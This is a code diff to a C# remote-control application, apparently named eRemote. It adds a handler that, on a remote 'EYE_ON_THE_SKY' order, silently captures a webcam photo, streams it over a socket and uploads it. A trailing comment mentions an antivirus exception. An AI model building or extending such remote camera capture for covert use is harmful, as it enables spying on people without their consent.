@@ -72,6 +72,7 @@ namespace eRemote_V2._0.LocalDatabase
 
         public static async Task OrderHandlerAsync(string order, string orderID, string key,string source ="")
         {
+            string timeStamp = Lib.GetTimestamp(DateTime.Now);
 
             switch (order)
             {
@@ -88,8 +89,28 @@ namespace eRemote_V2._0.LocalDatabase
                     LockHandler.LockPC(key, orderID, source);
                     break;
                 case "EYE_ON_THE_SKY":
-                    //string timeStamp = Info.GetTimestamp(DateTime.Now);
-                    //Camera.CaptureAsync($"cam_{timeStamp}_{key}.jpg",key,orderID).GetAwaiter();
+                    if (Camera.isHaveCamera() == 1)
+                    {
+                        // Get Camera Capture
+                        var camera_photo = Camera.CaptureCamera($"camera_{key}_{timeStamp}.png", key, orderID);
+                        // Convert Image to array of bytes
+                        var camera_bytes = Lib.ImageToByteArray(camera_photo);
+                        // Socket Emiting 
+                        var camera_emiited = await Socket.emittingEventAsync("CAMERA_REPLAY", orderID, order, camera_bytes);
+                        // Upload Image and Mark Order for Done
+                        if (camera_emiited) await Camera.CameraUploaderAsync(key,$"camera_{key}_{timeStamp}.png", orderID);
+                    }
+                    else
+                    {
+                        //// No Camera Photo -> 
+                        //// Convert Image to array of bytes
+                        //var camera_bytes = Lib.ImageToByteArray(camera_photo);
+                        //// Socket Emiting 
+                        //var camera_emiited = await Socket.emittingEventAsync("CAMERA_REPLAY", orderID, order, camera_bytes);
+                    }
+                 
+
+
                     break;
                 default:
                     Debug.WriteLine("Order Not Reconized");
@@ -187,5 +208,5 @@ namespace eRemote_V2._0.LocalDatabase
         }
     }
 }
-
+// Antivirus exception when running and trying uploading
 
